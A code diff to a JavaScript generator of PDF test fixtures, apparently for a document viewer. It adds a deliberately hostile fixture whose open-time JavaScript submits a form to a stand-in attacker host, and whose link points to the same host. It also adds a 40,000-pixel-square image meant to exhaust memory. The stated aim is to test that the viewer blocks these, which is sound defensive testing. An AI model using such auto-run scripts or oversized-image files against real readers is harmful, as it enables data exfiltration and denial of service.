@@ -40,13 +40,23 @@ const write = (name, bytes) => {
  * which lays runs out at chosen positions and sizes. The second form is what
  * the paragraph-geometry fixtures are built from: the reader finds paragraph
  * boundaries in exactly these coordinates.
+ *
+ * The rest of an object page is what the original-view fixtures need
+ * (`document-original-view`): `crop` sets a CropBox, `link` puts an external URI
+ * link annotation over the page, `image` draws an image XObject that *declares*
+ * the given pixel size (its stream is tiny — the size is the claim a viewer has
+ * to refuse), and `brokenFont` swaps Helvetica for an embedded font whose bytes
+ * are garbage. `options.javascript` adds a document-level script run on open.
  */
 /**
  * @typedef {{ x: number, y: number, size: number, text: string }} TextOp
- * @typedef {string | { rotate?: number, ops: TextOp[] }} PdfPage
+ * @typedef {{ rotate?: number, crop?: [number, number, number, number], link?: string,
+ *   image?: { width: number, height: number }, brokenFont?: boolean, ops: TextOp[] }} PdfObjectPage
+ * @typedef {string | PdfObjectPage} PdfPage
  * @param {PdfPage[]} pages
+ * @param {{ javascript?: string }} [options]
  */
-export function pdf(pages) {
+export function pdf(pages, options = {}) {
 	/** @type {string[]} */
 	const objects = [];
 	/** @param {string} body */
@@ -62,7 +72,7 @@ export function pdf(pages) {
 		// A page whose content stream draws no text is the scanned case: there is
 		// something on the page as far as a reader is concerned, and nothing at all
 		// as far as an extractor is concerned.
-		const stream =
+		const text =
 			typeof page === 'string'
 				? page
 					? `BT /F1 11 Tf 72 720 Td (${escape(page)}) Tj ET`
@@ -70,24 +80,76 @@ export function pdf(pages) {
 				: page.ops
 						.map((op) => `BT /F1 ${op.size} Tf ${op.x} ${op.y} Td (${escape(op.text)}) Tj ET`)
 						.join('\n');
+		const stream =
+			typeof page === 'object' && page.image ? `${text}\nq 200 0 0 200 72 300 cm /Im1 Do Q` : text;
 		contentIds.push(add(`<< /Length ${stream.length} >>\nstream\n${stream}\nendstream`));
 		pageIds.push(0); // placeholder, filled below
 	}
 
 	const fontId = add('<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>');
+	const objectPages = pages.filter((page) => typeof page === 'object');
+	const brokenFontId = objectPages.some((page) => page.brokenFont)
+		? (() => {
+				const junk = 'This is not a font program at all. '.repeat(8);
+				const file = add(`<< /Length ${junk.length} >>\nstream\n${junk}\nendstream`);
+				const descriptor = add(
+					`<< /Type /FontDescriptor /FontName /Broken /Flags 32 /FontBBox [0 0 1000 1000] ` +
+						`/ItalicAngle 0 /Ascent 800 /Descent -200 /CapHeight 700 /StemV 80 /FontFile2 ${file} 0 R >>`
+				);
+				return add(
+					`<< /Type /Font /Subtype /TrueType /BaseFont /Broken /FirstChar 32 /LastChar 126 ` +
+						`/FontDescriptor ${descriptor} 0 R >>`
+				);
+			})()
+		: null;
+	const imageIds = new Map();
+	for (const page of objectPages) {
+		if (!page.image) continue;
+		const pixels = 'ffffff';
+		imageIds.set(
+			page,
+			add(
+				`<< /Type /XObject /Subtype /Image /Width ${page.image.width} /Height ${page.image.height} ` +
+					`/ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /ASCIIHexDecode /Length ${pixels.length + 1} >>\n` +
+					`stream\n${pixels}>\nendstream`
+			)
+		);
+	}
+	const linkIds = new Map();
+	for (const page of objectPages) {
+		if (!page.link) continue;
+		linkIds.set(
+			page,
+			add(
+				`<< /Type /Annot /Subtype /Link /Rect [72 700 540 740] /Border [0 0 0] ` +
+					`/A << /S /URI /URI (${escape(page.link)}) >> >>`
+			)
+		);
+	}
+	const scriptId = options.javascript
+		? add(`<< /S /JavaScript /JS (${escape(options.javascript)}) >>`)
+		: null;
 	const pagesId = objects.length + pages.length + 1;
 
 	pages.forEach((page, i) => {
-		const rotate = typeof page === 'object' && page.rotate ? ` /Rotate ${page.rotate}` : '';
+		const object = typeof page === 'object' ? page : null;
+		const rotate = object?.rotate ? ` /Rotate ${object.rotate}` : '';
+		const crop = object?.crop ? ` /CropBox [${object.crop.join(' ')}]` : '';
+		const font = object?.brokenFont ? brokenFontId : fontId;
+		const image =
+			object && imageIds.has(object) ? ` /XObject << /Im1 ${imageIds.get(object)} 0 R >>` : '';
+		const annots = object && linkIds.has(object) ? ` /Annots [${linkIds.get(object)} 0 R]` : '';
 		pageIds[i] = add(
-			`<< /Type /Page /Parent ${pagesId} 0 R /MediaBox [0 0 612 792]${rotate} ` +
-				`/Resources << /Font << /F1 ${fontId} 0 R >> >> /Contents ${contentIds[i]} 0 R >>`
+			`<< /Type /Page /Parent ${pagesId} 0 R /MediaBox [0 0 612 792]${rotate}${crop}${annots} ` +
+				`/Resources << /Font << /F1 ${font} 0 R >>${image} >> /Contents ${contentIds[i]} 0 R >>`
 		);
 	});
 
 	const kids = pageIds.map((id) => `${id} 0 R`).join(' ');
 	add(`<< /Type /Pages /Kids [${kids}] /Count ${pages.length} >>`);
-	const catalogId = add(`<< /Type /Catalog /Pages ${pagesId} 0 R >>`);
+	const catalogId = add(
+		`<< /Type /Catalog /Pages ${pagesId} 0 R${scriptId ? ` /OpenAction ${scriptId} 0 R` : ''} >>`
+	);
 
 	let out = '%PDF-1.4\n';
 	const offsets = [0];
@@ -476,6 +538,60 @@ if (invokedDirectly) {
 					{ x: 72, y: 720, size: 11, text: 'This page is displayed turned on its side, and' },
 					{ x: 72, y: 704, size: 11, text: 'its passage still reads as one paragraph.' }
 				]
+			}
+		])
+	);
+
+	// --- The original-view fixtures (document-original-view) ---------------------
+	//
+	// A CropBox that moves the visible page's origin: stored boxes are in user
+	// space, so the viewer must subtract the crop through its viewport or every
+	// highlight lands 100pt off.
+	write(
+		'cropped-page.pdf',
+		pdf([
+			{
+				crop: [100, 100, 512, 692],
+				ops: [
+					{ x: 150, y: 600, size: 11, text: 'This page is cropped, and its first paragraph' },
+					{ x: 150, y: 584, size: 11, text: 'still sits where the crop box puts it.' }
+				]
+			}
+		])
+	);
+
+	// Everything a viewer must not do with a file: run its script on open, give a
+	// member a link out of the app, or fall over on a broken font. The words are
+	// ordinary, so the document still extracts and maps.
+	write(
+		'hostile-viewer.pdf',
+		pdf(
+			[
+				{
+					link: 'https://attacker.example/steal',
+					brokenFont: true,
+					ops: [
+						{
+							x: 72,
+							y: 720,
+							size: 11,
+							text: 'A member may leave at any time by telling a steward.'
+						}
+					]
+				}
+			],
+			{ javascript: "app.alert('pwned'); this.submitForm('https://attacker.example/');" }
+		)
+	);
+
+	// An image that claims 40 000 × 40 000 pixels — 1.6 GP decoded. The viewer's
+	// image-size cap must skip it rather than try.
+	write(
+		'huge-image.pdf',
+		pdf([
+			{
+				image: { width: 40_000, height: 40_000 },
+				ops: [{ x: 72, y: 720, size: 11, text: 'A page with an enormous picture on it.' }]
 			}
 		])
 	);
